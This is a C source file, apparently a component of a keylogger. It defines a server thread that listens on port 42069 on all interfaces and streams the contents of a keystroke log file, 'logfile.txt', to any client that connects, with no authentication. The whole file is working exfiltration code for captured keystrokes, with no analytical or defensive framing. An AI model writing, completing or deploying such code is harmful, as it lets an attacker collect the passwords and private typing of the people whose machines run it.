//
// Created by jubuntu on 12/6/23.
//
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define THE_PORT 42069
#define LOGFILE_NAME "logfile.txt"

void* server(void* file) {

    FILE* keylog = (FILE*) file;
    int childpid, ctrlfd, listenfd;
    struct sockaddr_in clientAddr, servAddr;

    socklen_t length = sizeof(struct sockaddr_in);

    /* get a socket to listen to */
    if ((listenfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        fprintf(stderr, "Error: %s\n", strerror(errno));
        exit(1);
    }

    /* set some options for the socket */
    if ((setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int))) == -1){
        fprintf(stderr, "Error: %s\n", strerror(errno));
        exit(1);
    }

    /* Zero some memory, then assign some server protocols */
    if ( memset(&servAddr, 0, sizeof(servAddr)) == NULL){
        fprintf(stderr, "Error: %s\n", strerror(errno));
        exit(1);
    }
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(THE_PORT);
    servAddr.sin_addr.s_addr = htonl(INADDR_ANY);

    /* assign the address to the socket */
    if (bind(listenfd, (struct sockaddr *) &servAddr, sizeof(servAddr)) < 0) {
        fprintf(stderr, "Error: %s\n", strerror(errno));
        exit(1);
    }

    /* The server is ready to live a long life, accepting
    * connections and forking along the way.
    * Viva server! */
    while (1) {

        /* Listen for connection request, queue size of 1 */
        if (listen(listenfd, 1) < 0) {
            fprintf(stderr, "Error: %s\n", strerror(errno));
            exit(1);
        }

        /* a client would like to connect. accept the connection */
        if ((ctrlfd = accept(listenfd, (struct sockaddr *) &clientAddr, &length)) < 0) {
            fprintf(stderr, "Error: %s\n", strerror(errno));
            exit(1);
        }

        printf("Client connected\n");
        printf("Sending keylog\n");

        int filefd = open(LOGFILE_NAME, O_RDWR);
        ssize_t rd;
        char buffer[1024];


        printf("The fd for keylog is %d\n", filefd);
        while ((rd = read(filefd, buffer, 1024)) > 0){
            ssize_t wr = write(ctrlfd, buffer, rd);
            printf("Wrote %lu bytes\n", wr);
        }

        if (rd < 0) printf("Warning: Send failure\n");
        else printf("Send success\n");

        close(ctrlfd);
        close(filefd);
    }
}